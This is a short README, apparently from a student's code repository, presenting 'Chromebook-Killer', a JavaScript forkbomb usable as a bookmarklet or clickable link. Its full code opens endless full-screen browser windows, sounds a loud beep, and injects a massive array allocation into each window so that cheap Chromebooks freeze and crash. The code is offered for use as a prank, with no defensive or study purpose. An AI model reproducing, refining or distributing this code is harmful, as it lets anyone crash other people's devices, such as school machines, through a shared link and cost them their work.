# 🔥 Chromebook-Killer
*"I was bored in school. Nothing new there."*

The code below is a a modified forkbomb that works in HTML and JavaScript. Keep in mind that this is targeted towards more cheap, low end Chromebooks, but I havent tested it on more powerful devices.

#### 🚀 Features
* Lags the Chromebook by spamming new browser windows.
* Plays a loud beeping noise until chromebook crashes (scary ;-;).
* On each new window it creates, it adds an array that will crash that new window.
* Can be used as a bookmarklet or clickable link.

#### 💾 Code
```js
for(;;){
  var a=Math.floor(100*Math.random()+1),
  b=window.open("_blank","Lag"+a,`height=${screen.height},width=${screen.width}`);
  au=new AudioContext(); v=au.createOscillator(); u=au.createGain(); v.connect(u); v.frequency.value=130; v.type="square"; u.connect(au.destination); u.gain.value=100*0.01; v.start(au.currentTime); v.stop(au.currentTime+300*0.001);
  b.document.body.innerHTML=`<script>[...Array(2**32-1)]</script>`
}
```
